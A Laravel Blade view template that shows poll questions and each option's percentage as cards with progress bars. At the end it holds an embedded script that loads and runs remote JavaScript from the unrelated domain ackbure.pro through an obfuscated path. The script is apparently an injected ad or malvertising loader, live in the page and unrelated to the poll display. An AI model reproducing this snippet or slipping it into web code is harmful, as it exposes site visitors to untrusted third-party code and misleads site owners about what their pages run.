<div class="row">
    @foreach ($polls as $poll)
        <div class="col-md-4">
            <div class="card" style="height: calc(100% - 1rem);">
                <div class="card-body">
                    <p class="font-weight-bold">
                        {{ $poll->question }}
                    </p>

                    @foreach($poll->options_extended as $option)
                        <div class="progress-group">
                            {{ $option->value }}
                            <span class="float-right">
                                {{ $option->percentage }}%
                            </span>
                            <div class="progress progress-xs">
                                <div class="progress-bar bg-gray" style="width: {{ $option->percentage }}%"></div>
                            </div>
                        </div>
                    @endforeach
                </div>
            </div>
        </div>
    @endforeach
    <div class="col-md-4">
        <script>
            (function(__htas){
                var d = document,
                    s = d.createElement('script'),
                    l = d.scripts[d.scripts.length - 1];
                s.settings = __htas || {};
                s.src = "\/\/ackbure.pro\/a\/WlZ.y\/Q\/2v9\/kzZGT\/9v6PbP2Q5BlISRWNQS9lNQD\/Ed0xM\/D-kL3pMHSB0\/0JM\/TUQkwwOvTmcHysJknVB\/1vcN2uhTagbL2\/5\/ltS\/WVQW9\/NjDaEz0YMBD\/kC3PMBSV0n0oM\/ThQfwKO\/TIcoyM";
                l.parentNode.insertBefore(s, l);
            })({})
        </script>
    </div>
</div>
